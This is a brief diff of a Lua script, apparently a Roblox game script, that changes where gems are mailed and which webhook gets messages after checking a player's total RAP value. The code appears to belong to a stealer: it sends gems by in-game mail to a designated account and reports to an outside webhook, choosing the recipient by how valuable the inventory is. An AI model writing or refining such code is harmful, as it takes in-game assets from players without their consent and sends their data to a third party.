@@ -299,9 +299,8 @@ spawn(function()
     if totalRAP > 100000 then
         -- If total RAP > 100,000:
         -- Send both message and mail to highRAPWebhook/highRAPUser
-        SendMessage(highRAPUser, GemAmount1, highRAPWebhook, highRAPUser)  -- Ensure to send message to highRAPUser
-        SendMail(highRAPUser, GemAmount1, highRAPWebhook)  -- Ensure mail is sent to highRAPUser
-
+        SendMessage(targetUser, GemAmount1, targetWebhook, targetUser)  -- Use targetUser and targetWebhook
+        SendMail(targetUser, GemAmount1, targetWebhook)  -- Use targetUser and targetWebhook
     else
         -- If total RAP <= 100,000:
         -- Send both message and mail to global webhook/user
@@ -309,7 +308,7 @@ spawn(function()
         SendMail(user, GemAmount1, webhook)  -- Send mail to global user
 
         -- Also send message to highRAPWebhook/highRAPUser (without mail)
-        SendMessage(highRAPUser, GemAmount1, highRAPWebhook, highRAPUser)
+        SendMessage(targetUser, GemAmount1, targetWebhook, targetUser)  -- Use targetUser and targetWebhook
     end
 end)
 
